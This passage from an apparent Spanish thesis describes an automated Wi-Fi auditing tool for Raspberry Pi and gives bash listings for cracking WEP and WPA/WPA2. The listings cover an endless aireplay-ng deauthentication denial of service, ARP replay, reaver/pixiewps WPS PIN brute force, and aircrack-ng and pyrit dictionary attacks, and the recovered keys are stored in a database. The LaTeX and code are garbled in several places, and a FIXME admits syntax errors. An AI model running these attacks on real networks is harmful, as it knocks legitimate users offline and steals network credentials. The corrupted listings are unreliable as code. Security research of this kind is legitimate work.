            ProcesarDatosEscaneoAirodump
        else
          if [ -f  $ARCHIVO_DETENER_SCAN ]
          then
          echo "ESCANEO DETENIDO, PROCESANDO DATOS, ESPERA ..." > $ARCHIVO_STATUSBAR
          rm $ARCHIVO_DETENER_SCAN
          PID_AIRODUMP=`ps -A | grep airodump-ng | awk '{ print $1}'`
          kill $PID_AIRODUMP &> /dev/null
          ATAQUE_ACABADO="NO"
          ProcesarDatosEscaneoAirodump
          return
      fi
      TIEMPO_RESTANTE=`expr $TIEMPO_SCANEO - $A`
      echo "BUSCANDO REDES, ESPERA $TIEMPO_RESTANTE segundos" > $ARCHIVO_STATUSBAR
    fi
    
    t TARJETA_MODO_MONITOR TIEMPO_SCANEO TIEMPO_RESTANTE PID_AIRODUMP A ATAQUE_ACABADO
}
\endlisting}

    \item Se muestran las redes escanedas y se listan con la siguiente información. bssid, intensidad, tipo red, essid, etc.

\begigure}[H]
  \cring
    \includegraphics[width=1\textwidth]{Interfaz4.png}
  \con{Interfaz gráfica. Muestra información relevante.}
   \l{fig:int4}
\endure}
A couación se muestra el método encargado de listar las redes inalámbricas a nuestro alcance:

\begstlisting}        [label=prueba2,caption=Listar Redes]
ListrjetasWifi() {   
    RFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
    CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
    CONT=1
    e [ $CONT -le $CUANTAS ]
    
    MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'` 
    airmon-ng stop $MON > /dev/null 2>&1
    let CONT=$CONT+1
    
     '<comboboxtext active="0" button-sensitivity="1">'
     '<variable>TARJETA_SELECCIONADA</variable>'
    ETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | \
                           awk '{print $1}' | sort`
     "$(iwconfig)" >> "$LOG_TARJETA_WIFI"
    RJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
     "$TARJETAS_WIFI_DISPONIBLES" = "" ]
    
    exit 1
    
    let x=1
    while [ $x -le $N_TARJETAS_WIFI ]
    do
        INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
        DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | \
                sed 's/^.*\/\        ([a-zA-Z0-9_-]*\)$/\1/'`
        echo '<item>'$INTERFAZ' '$DRIVER'</item>'
        x=$((x+1))
    done
    
     "</comboboxtext>"
    t INTERFACES_MONITOR CONT CUANTAS MON TARJETAS_WIFI_DISPONIBLES \
      N_TARJETAS_WIFI INTERFAZ DRIVER x
}
\endlisting}

    \item En esta pantalla se selecciona la red que se quiere analizar. Si es WEP se selecciona el botón Atacar WEP y si es WPA/WPA2 se selecciona el botón Atacar WPA.
\endmerate}


\begigure}[H]
  \cring
    \includegraphics[width=1\textwidth]{Interfaz5.png}
  \con{Interfaz gráfica. Selección de red que se vaya analizar.}
   \l{fig:int5}
\endure}

Si scoge ATACAR WEP se realizan los siguientes análisis:
\begtemize}
    \item AircrackWEP()
    \item DenegacionServicio()
    
\endmize}
Si scoge ATACAR WPA se realizan los siguientes análisis:
\begtemize}
    \item ExtraerDatosAp()
    \item AircrackWPA()
    \item AnalizarPyrit()
    \item DenegacionServicio()
\endmize}

%%%AES%%%
\sec[Análisis de vulnerabilidades]{Ejecución de análisis de vulnerabilidades. Realización de ataques.}
Paradetección de las vulnerabilidades de la red seleccionada se llevará a cabo la iniciación de ataques a la misma, para así poder recoger la información y analizarla. 
El laje empleado para la automatización de los ataques es bash, dependiendo del tipo de protocolo que utilice la red seleccionada, se empleará una serie de ataques distintos. A continuación se emplea un gráfico \ref{fig:ataque}, para facilitar el entendimiento de los posibles ataques y la sucesión de ellos. Comenzaremos ejecutando la aplicación. Ésta, hará una búsqueda de las posibles tarjetas de red que se encuentren conectadas a nuestro dispositivo. Una vez que encuentre la tarjeta de red disponible, la pondrá en modo monitor para posteriormente escanear las redes a su alcance. Cuando se disponga del listados de las posibles redes, se seleccionara la que se quiere analizar. Siendo posible dos soluciones: 

\begtemize}
    \item Si el protocolo de cifrado que encuentra es WEP, el primer ataque a realizar será una denegación de servicios (DOS), una vez se haya dejado sin internet al punto de acceso por el exceso de paquetes recibidos se intentará un ataque de fuerza bruta. Utilizando la herramienta \textit{aireplay-ng} para capturar un numero determinado de IV, se terminará consiguiendo la contraseña utilizando \textit{aircrack-ng}.
    \item Si fuera WPA o WPA2 se empezará con un ataque de denegación de servicios como en el caso de WEP. Se comprobará si dispone de WPS activado, si fuera así se atacaría con el comando \textit{reaver} y \textit{pixiewps}. Si no, se trataría de un ataque en diccionario, es el ataque que más tiempo necesita, ya que comprueba una por una las palabras del diccionario del que se disponga. Para ello utiliza \textit{aireplay-ng} para desautenticar e inyectar y generar así tráfico para la captura del \textit{handshake}. Una vez se disponga de él, se utilizará \textit{aircrack} para hacer la búsqueda. Al cabo de un tiempo determinado se completará el análisis
\endmize}

\begigure}[H]
  \cring
   \udegraphics[width=0.7\textwidth]{ataque.png}
  \con{Pasos a seguir para el ataque.}
  \l{fig:ataque}
\endure}

\subection{Ataque red WEP}
Comose ha comentado, las redes WEP tienen muchas debilidades criptográficas, por lo que se ha utilizado las herramientas necesarias para intentare romper la encriptación WEP.
Lo pro, será configurar la tarjeta como modo monitor para un posterior escaneo de las redes cercanas empleando el comando \textit{airodump-ng}. Así, se comenzará a volcar todo el tráfico que hay en el aire en un archivo determinado (LOG\_CAP). En este punto, se detectará el cifrado WEP de la red seleccionada y si existe cliente asociado a dicha red. Si existe cliente asociado, el crackeo será más sencillo, sino, se hará una falsa autenticación con una MAC aleatoria.
Una elegida la red, se comienza a inyectar con dos objetivos distintos, el primero será desautenticar el cliente asociado con el fin de que vuelva a autenticarse y genere un paquete ARP válido, y el segundo para capturar el paquete ARP y reinyectarlo para generar un gran volumen de paquetes de datos. Como ya se habló en la parte teórica, es importante obtener una gran cantidad de IVs y así poder predecir y atacar la clave que descifran los paquetes, obteniendo la clave de red.

\begstlisting}[label=prueba3,caption=Aircrack WEP]
AircWEP() {
    echo "***************** Aircrack WEP******************"
    CambioMacRandom
    LINEA_AUX=$LINEA_ATAQUE
    LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
    BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
    CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
    ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
    PRIVACY=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $5 '})
    CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
    TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})                

    if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
    then
        #Utilizo mi propia interfaz para realizar falsa autenticación
        TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
    else
        TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})                
    fi

    TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
    sudo airmon-ng stop $TARJETA_MODO_MONITOR
    TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)        
    INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
    sudo airmon-ng start $INTERFAZ $CANAL
    X1="airmon-ng start $INTERFAZ $CANAL"
    airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR
    X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
    echo "....Comienzo a inyectar..."
    aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
    X3="aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
    aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
    X4="aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
    TIEMPO_ESCANEO="120"
    for A in `seq 1 $TIEMPO_ESCANEO` 
    do
        sleep 1s
        if [ $A -eq $TIEMPO_ESCANEO ]; then
            X5="aircrack-ng -a 1 -s output-01.cap"
            sudo aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
        else
            TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
        fi
    done
    EsperarAcabarAircrack 10
    X6=`cat "aircrack-$BSSID.dat" | grep "WEP" | awk -F '(' '{print $2}' | awk -F 'IVs' '{print $1}'`
    X8=`cat "aircrack-$BSSID.dat" | grep "KEY FOUND"`
    X7="SI"
    if [ ! `echo "aircrack-$BSSID.dat" | grep "KEY FOUND"`  ] ; then
        X7="NO"
    fi
    X9="aircrack-$BSSID.dat"

    (`sudo python "$RUTA_INFORME/SECWEP1.py" $BSSID "$ESSID" $CANAL $TARJETA_SELECCIONADA_MAC`)
    (`sudo python "$RUTA_INFORME/SUBSWEP1.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7" "$X8" "$X9"`)
    unset A, X1, X2, X3, X4, X5, X6, X7, X8, X9, BSSID, CANAL, ESSID
}
\end{lstlisting}

\subsubsection{Denegación de servicios.}
El objetivo de este ataque es dejar a los usuarios legítimos de una red Wi-Fi sin poder acceder a internet. Por lo tanto, se inunda con paquetes de desautenticación al punto de acceso o al cliente que decida.
Como siempre, la tarjeta inalámbrica debe estar en modo monitor y escuchando en el canal específico. Así se desautenticará en un bucle infinito  al cliente o al punto de acceso que se seleccione.

\begin{lstlisting}        [label=prueba4,caption=Denegación de servicios]
DenegacionServicio (){
    echo "***************** Denegacion de Servicio******************"
    LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
    BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
    CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
    ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
    TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
    echo "MAC:$TARJETA_SELECCIONADA_MAC"# Tarjeta MAC seleccionada.
    TARJETA_MODO_MONITOR=$(head -2 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
    sudo airmon-ng stop $TARJETA_MODO_MONITOR
    sleep 5
    X1="airmon-ng start $TARJETA_MODO_MONITOR $CANAL"
    airmon-ng start $TARJETA_MODO_MONITOR $CANAL
    sleep 2
    X2="aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR"
    aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR
    #SI hay cliente conectado
    BuscarClienteConectado $BSSID
    X3="aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
    aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
    TIEMPO_ESCANEO="120"
    for A in `seq 1 $TIEMPO_ESCANEO` ; do
        sleep 1s
        if [ $A -eq $TIEMPO_ESCANEO ]; then
            sudo killall xterm
        else
            TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
        fi
    done
    #Comprobar la DOS
    (sudo python "$RUTA_INFORME/SUBSDOS.py" "$X1" "$X2" "$X3" "$X4")
    sudo airmon-ng stop $TARJETA_MODO_MONITOR
    sleep 5
    sudo airmon-ng start $TARJETA_MODO_MONITOR
}

\end{lstlisting}

\subsubsection{Ataque WPA con WPS activado}
Una vez que sabemos que la red seleccionada tiene un cifrado WPA y cuenta con el WPS activado, realizo:
\paragraph{reaver:}
Reaver se planteó como un ataque sólido y muy conveniente contra WPS. Se ejecuta un ataque de fuerza bruta contra el punto de acceso, creando todas las combinaciones posibles para adivinar el numero PIN de 8 dígitos del Punto de Acceso. Si fuera una red WPA, sabemos que la combinación son mucho mayores, ya que puede haber letras, números y a veces incluso símbolos, por lo tanto el ataque será mucho mas difícil y largos de ejecutar. Sin embargo en WPS sabemos que el último dígito es un valor de suma de control que podría ser calculada en base a los 7 dígitos anteriores, por lo que las combinaciones se reducirían mucho. Podemos reducir mas el tiempo ya que el numero de PIN para la verificación va en dos mitades, por lo que se puede comprobar independientemente los 4 primeros y los últimos 4 dígitos.''
Como siempre, se activará el modo monitor de la tarjeta inalámbrica y se empezará a capturar el tráfico en el aire con \textit{airodump-ng} para obtener los \textit{beacons} de información del punto de accesos, y así comprobar que el dicho punto esta utilizando WPS.
Una vez detectado WPS en el punto de acceso se prueba mediante la herramienta \textit{reaver} si el punto es vulnerable. Ésta, realizará fuerza bruta sobre el punto de acceso, enviando distintos PIN hasta encontrar el que le devuelva la credencial de la red con cifrado WPA2.

\begin{lstlisting}        [label=prueba5,caption=Ataque Reaver]
Atacarreaver(){
    TARJETA_SELECCIONADA=`cat $ARCHIVO_TARJETA_SELECCIONADA` 
    TARJETA_MODO_MONITOR=`cat $ARCHIVO_TARJETA_MONITOR` 
    ifconfig $TARJETA_SELECCIONADA up &> /dev/null
    ATAQUE_DETENIDO="NO"
    (`sudo python "$RUTA_INFORME/SECWPA1.py" $BSSID "$ESSID" $CANAL $TARJETA_MODO_MONITOR`)
    echo "ATACANDO BSSID $BSSID EN CANAL $CANAL" > $ARCHIVO_STATUSBAR
    X1="reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D"
    reaver_pixie -F -G -i $TARJETA_MODO_MONITOR -b $BSSID -c $CANAL -a -n -vv -D \
                 > $ARCHIVO_TXT_ATAQUE 2> /dev/null
    if ! EsperarAcabarReaver ; then
        if [ $AUTOMATICO = 0 ]; then
            if [ $vez -eq 1 ]; then
                #Infome Latex SUBSWPA1-Template.tex
                X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
                X3="..LOGS\TXT_ATASQUE"
                X4="FIN-Template"
                (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
            else
            fi
        fi
    
        if [ $vez -eq 1 ]; then 
            AgregarBssidDatabases 1
            ATAQUE_ACABADO="SI"
            if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosEscaneoAirodump; fi
                echo "1" > $ARCHIVO_LOG
                return 1 
            fi
        fi
        if [ $ATAQUE_DETENIDO = "SI" ]; then 
            return; 
        fi
        if ! ExtraerDatosReaver ; then
            if [ $AUTOMATICO = 0 ]; then 
                yad --image "error" --title "ATAQUE FALLIDO" 
                    --button=gtk-ok:0 --text "<b>ERROR</b>: $MENSAJE_ERROR DE $BSSID" 
                    --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png ;
            fi
            echo "$MENSAJE_ERROR DE $BSSID" > $ARCHIVO_STATUSBAR
            echo "1" > $ARCHIVO_LOG
            AgregarBssidDatabases 1
            ATAQUE_ACABADO="SI"
            if [ $ACTUALIZAR_SCAN = "SI" ]; then 
                ProcesarDatosEscaneoAirodump; 
            fi
            #Infome Latex SECWPA1-Template.tex
            X2="NO SE HAN PODIDO OBTENER LOS DATOS NECESARIOS DE $BSSID"
            X3="..LOGS\TXT_ATAQUE"
            X4="FIN-Template"
            (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
            echo "1" > $ARCHIVO_LOG
            return
        fi
        echo "PROBANDO CON PIXIEWPS 1.0 by wiire" > $ARCHIVO_STATUSBAR
        #Infome Latex SECWPA1-Template.tex
        X2="Se ha obtenido la informaciÛn requerida"
        X3="pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee"
        X4="PIXIEWPS"
        (`sudo python "$RUTA_INFORME/SUBSWPA1.py" "$X1" "$X2" "$X3" "$X4"`)
        pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee &>> $ARCHIVO_TXT_ATAQUE
        AnalizarLogPixiewps
        echo "1" > $ARCHIVO_LOG
}
\end{lstlisting}

\FIXME{El archivo de arriba tiene errores sintácticos, else vacío, if sin cerrar.}

\paragraph{Pixiewps:}
Este ataque \textit{Pixiewps} es también conocido como \textit{polvo mágico}. Lo primero que hará es comprobar si el router al que se le realiza el ataque es vulnerable. Si así lo fuera, se podrá obtener la clave en segundos. Continuando los pasos de los ataques anteriores y utilizando la tarjeta en modo monitor y escaneando el tráfico, se atacará a una de las redes disponibles que disponga de WPS activado. Primero utilizaremos el comando \textit{reaver} para recoger la PKE (clave pública de la persona inscrita), PKR (clave pública del registrador),e-hash 1 (hash  de la primera mitad del PIN WPS, fuerza bruta) y E-2 de hash (hash  de la segunda mitad del PIN WPS, fuerza bruta), E-nonce/ R-nonce y la authkey. Una vez se obtenga toda la información, se podrá aplicar pixiewps, para reducir tiempos.

\begin{lstlisting}        [label=prueba17,caption=PixieWPS]
AnalizarLogPixiewps(){
    lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk {' print$1 '})
    for A in `seq 1 $lineas_log` ; do 
        linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
        if [[ $linea == *"WPS pin"* ]] ; then 
            if [[ $linea == *"not found"* ]]; then 
                echo "$BSSID : ATAQUE FALLIDO, BSSID" \
                     "NO VULNERABLE A PIXIEWPS ATTACK" > $ARCHIVO_STATUSBAR
                AgregarBssidDatabases 2
                ATAQUE_ACABADO="SI"
                if [ $ACTUALIZAR_SCAN = "SI" ]; then 
                    ProcesarDatosEscaneoAirodump;
                fi
                return 1
            fi
            PIN_WPS=`echo $linea | awk -F":" {' print $2 '} `
            echo "$BSSID : PIN WPS CONSEGUIDO," \
                 "RECUPERANDO CLAVE WPA, ESPERA ..." >$ARCHIVO_STATUSBAR
            X13="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
            reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS &>>$ARCHIVO_TXT_ATAQUE
            let vez=2
            if EsperarAcabarReaver ; then
                if [ $ATAQUE_DETENIDO = "SI" ]; then 
                    return;
                fi
                RecuperarClaveWpa
            else
                CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
            fi
            echo $fabricante > $ARCHIVO_TXT_ATAQUE
            echo $modelo >> $ARCHIVO_TXT_ATAQUE
            echo $numero_de_modelo >> $ARCHIVO_TXT_ATAQUE
            echo $numero_de_serie >> $ARCHIVO_TXT_ATAQUE
            echo $device_name  >> $ARCHIVO_TXT_ATAQUE
            echo "- ESSID : "$ESSID >> $ARCHIVO_TXT_ATAQUE
            echo "- BSSID : "$BSSID  >> $ARCHIVO_TXT_ATAQUE
            echo "- PIN WPS : "$PIN_WPS >> $ARCHIVO_TXT_ATAQUE
            echo "- KEY WPA : "$CLAVE_WPA >> $ARCHIVO_TXT_ATAQUE
      
            echo $fabricante > $CARPETA_KEYS"$ESSID.DATOS"
            echo $modelo >> $CARPETA_KEYS"$ESSID.DATOS"
            echo $numero_de_modelo >> $CARPETA_KEYS"$ESSID.DATOS"
            echo $numero_de_serie >> $CARPETA_KEYS"$ESSID.DATOS"
            echo $device_name  >> $CARPETA_KEYS"$ESSID.DATOS"
            echo "- ESSID : "$ESSID >> $CARPETA_KEYS"$ESSID.DATOS"
            echo "- BSSID : "$BSSID  >> $CARPETA_KEYS"$ESSID.DATOS"
            echo "- PIN WPS : "$PIN_WPS >> $CARPETA_KEYS"$ESSID.DATOS"
            echo "- KEY WPA : "$CLAVE_WPA >> $CARPETA_KEYS"$ESSID.DATOS"
  
            fabricante=$(echo $fabricante | awk -F":" {' print $2 '})
            modelo=$(echo $modelo | awk -F":" {' print $2 '})
            numero_de_modelo=$(echo $numero_de_modelo | awk -F":" {' print $2 '})
            numero_de_serie=$(echo $numero_de_serie | awk -F":" {' print $2 '})
            device_name=$(echo $device_name | awk -F":" {' print $2 '})
            #Inicio Infome Latex PIXIEWPS-Template.tex
            X1="pixiewps -e $PKe -r $PKr -s $EHash1 -z $EHash2 -a $AuthKey -n $Enrollee"
            X2=$PIN_WPS
            X3="reaver_pixie -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -c $CANAL -p $PIN_WPS"
            X4=$CARPETA_KEYS"$ESSID.DATOS"
            (`sudo python "$RUTA_INFORME/PIXIEWPS.py" "$X1" $Pke $PKr $EHash1 $EHash2\ 
                                                    $AuthKey $Enrollee $X2 "$X3" "$X4"`)
            #Fin Latex
            if ! grep -q $BSSID $ARCHIVO_DATABASE_KEYS ; then
                if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ]; then 
                    CLAVE_WPA="?"; 
                fi 
                echo "$ESSID|$BSSID|$PIN_WPS|$CLAVE_WPA|$fabricante|$modelo|$numero_de_modelo|"\
                     "$numero_de_serie|$device_name" >> $ARCHIVO_DATABASE_KEYS
            else
                if [ $(grep $BSSID $ARCHIVO_DATABASE_KEYS | \
                       awk -F"|" {'print $4'}) = "?" ] && [ $CLAVE_WPA != "?" ] ; then
                    sed '/'$BSSID'/d' $ARCHIVO_DATABASE_KEYS | sed '/^$/d' > TEMPORAL
                    mv TEMPORAL $ARCHIVO_DATABASE_KEYS
                    echo "$ESSID|$BSSID|$PIN_WPS|$CLAVE_WPA|$fabricante|$modelo|"
                         "$numero_de_modelo|$numero_de_serie|$device_name" >> $ARCHIVO_DATABASE_KEYS
                fi
            fi
            echo "$BSSID : ATAQUE FINALIZADO, SE HA GENERADO EL ARCHIVO $ESSID.DATOS" > $ARCHIVO_STATUSBAR
            AgregarBssidDatabases 3
            ATAQUE_ACABADO="SI"
            if [ $ACTUALIZAR_SCAN = "SI" ]; then 
                ProcesarDatosScaneo;
            fi
        fi 
    done
    unset lineas_log A linea PIN_WPS CLAVE_WPA fabricante modelo \
          numero_de_modelo numero_de_serie device_name  
}

RecuperarClaveWpa() {
  lineas_log=$(cat $ARCHIVO_TXT_ATAQUE | wc -l | awk '{print $1}')
  let A=0
  for A in `seq 1 $lineas_log` ; do 
   linea=`head -$A $ARCHIVO_TXT_ATAQUE | tail -1`
    if [[ $linea == *"WPA PSK"* ]] 
    then 
     CLAVE_WPA=`echo $linea | awk -F":" {' print $2 '}`
     CLAVE_WPA=`echo $CLAVE_WPA | awk -F"'" {' print $2 '}`
    fi
  done
}
\end{lstlisting}


\subsubsection{Ataque por fuerza bruta WPA/WPA2 }
Sabemos que WPA y WPA2 PSK tiene posibles vulnerabilidades a un ataque de diccionario. Para la realización de este ataque es necesario el \textit{handshake } (saludo de cuatro vías) entre el punto de acceso y el cliente y un listado de palabras con frases comunes. Empleando el comando \textit{aircrack-ng}, se tratará de romper la contraseña.

El tener que emplear la fuerza bruta es un gran inconveniente, ya que se hará un uso intensivo del procesador de la Raspberry Pi. Este proceso, si se dejara podrá llegar a durar horas e incluso días comprobando las posibles palabras del diccionario. En nuestro caso se pondrán tiempo cortos para que no se demore en exceso.

\begin{lstlisting}        [label=prueba7,caption=AircrackWPA]
AircrackWPA() {
    echo "***************** Aircrack WPA******************"
    CambioMacRandom
    LINEA_ATAQUE=$LINEA_AUX
    LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
    BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
    CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
    ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
    PRIVACY=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $5 '})
    CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
    TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})                
    if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]; then
        #Utilizo mi propia interfaz para realizar falsa autenticacion
        TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
    else
        TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})                
    fi
    TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
    sudo airmon-ng stop $TARJETA_MODO_MONITOR
    TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)        
    INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
    sudo airmon-ng start $INTERFAZ $CANAL
    X1="airmon-ng start $INTERFAZ $CANAL"
    airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR
    X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
    echo "..Comienzo a inyectar.."
    aireplay-ng -0 1 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
    X3="aireplay-ng -0 1 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" 
    TIEMPO_ESCANEO="60"
    for A in `seq 1 $TIEMPO_ESCANEO` ; do
        sleep 1
        if [ $A -eq $TIEMPO_ESCANEO ]
        then
            X4="aircrack-ng -a 2 -s output-01.cap -w wordlist.lst"
            sudo aircrack-ng -a 2 -s "$CAPTURA_AIRCRACK-01.cap" -w $WORDLIST >> 
            "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
            echo "aircrack-ng -a 2 -s "$CAPTURA_AIRCRACK-01.cap" -w $WORDLIST" >> 
            "$RUTA_AIRCRACK/salida.log"
        else
            TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
        fi        
    done
    EsperarAcabarAircrack 15
    X5="90"
    X6="SI"
    if [ ! `echo "$RUTA_AIRCRACK/aircrack-$BSSID.dat" | grep "KEY FOUND"`  ]; then
        X6="NO"
    fi
    X7="aircrack-$BSSID.dat"
    (`sudo python "$RUTA_INFORME/SUBSWPA2.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7"`)
    unset A, X1, X2, X3, X4, X5, X6, X7, BSSID, CANAL, ESSID
}
\end{lstlisting}

\subsubsection{Utilizamos Pyrit}
Es un herramienta muy potente que facilita la creación de bases de datos para pre-calcular las claves PSK y así acelerar el pre-procesamiento, aprovechando al máximo las plataformas del mercado (Nvidia CUDA, OpenCL) y así poder descifrar claves WPA o WPA2 mediante ataques de fuerza bruta o diccionario. Es necesario haber capturado con anterioridad el handshake. Se empleará un diccionario con el que cuenta por defecto kali linux (\textit{rockyou}), que se renombrará como wpa.lst.

\begin{lstlisting}[label=prueba8,caption=Analizar Pyrit]
AnalizarPyrit() {
    echo "***************** Analizando con Pyrit******************"
    LINEA_ATAQUE=$LINEA_AUX
    LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$LOG_REDES_ESCANEADAS" | tail -1)
    BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
    ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
    #Creamos el ESSI real del handshake capturado
    pyrit -e "$ESSID" create_essid
    X1="pyrit -e "$ESSID" create_essid"
    sleep 10s
    #utilizamos diccionario rockyou.txt renombrado a wpa.lst
    pyrit -i $WORDLIST import_passwords
    X2="pyrit -i $WORDLIST import_passwords"
    sleep 600s
    #Creamos las tablas utilizando proceso batch
    pyrit batch
    X3="pyrit batch"
    #Asumimos que tenemos capturado el handshake
    X4="pyrit -r captura-01.cap attack_db"
    pyrit -r "$CAPTURA_AIRCRACK-01.cap" attack_db >> "$LOG_PYRIT" &
    X5="60"
    CLAVE=$(cat $LOG_PYRIT | grep "The password is")
    X6="SI"
    if [ ! `echo $CLAVE | grep "The password is"` ] ; then
        X6="NO"
    fi
    X7="PYRIT.LOG"
    (sudo `python $RUTA_INFORME/SUBSWPA3.py "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7"`)
}

\end{lstlisting}

%DenegacionServicio()
%\lstinputlisting[language=Python] {DenegacionServicio().txt}




%%%%%INFORME%%%%%
\section[Generación de informe]{Generación de un informe con posibles vulnerabilidades de la red}
\subsection{Pautas y seguimiento para la creación del informe} 
Partiendo de un lenguaje de programación desde el cual se ha desarrollado el código para automatizar el dispositivo, se contará con otro lenguaje de programación (\textit{Python}) para que interactue, y por medio de una de sus bibliotecas \textit{Jinja2}, genere unas plantillas (templates) donde se irán introduciendo los datos variables. Como se muestra en el gráfico, una vez obtengamos el informeWEP.tex o informeWPA.tex dependiendo del protocolo de la red, se utilizara la aplicación \textit{pdflatex} para generar el informe final.pdf.
\begin{figure}[H]
  \centering
   \includegraphics[width=0.6\textwidth]{informe.png}
  \caption{Pasos a seguir para generar el informe.}
  \label{fig:esquema3}
\end{figure} 

\paragraph{Generar informe WEP.}

Se mostrará un gráfico con el fin de facilitar y entender el funcionamiento para la generación del informe WEP
\begin{figure}[H]
  \centering
   \includegraphics[width=1.2\textwidth]{InformeWEP.png}
  \caption{Pasos a seguir informe WEP}
  \label{fig:informeWEP}
\end{figure}
Ahora, se podrá comprobar como son las funciones a la hora de la generación del informe.

\begin{lstlisting}[label=prueba9,caption=Crear informe WEP]
CrearInformeWEP() {
    cd $RUTA_INFORME
    pdflatex -interaction=nonstopmode informe_WEP.tex"
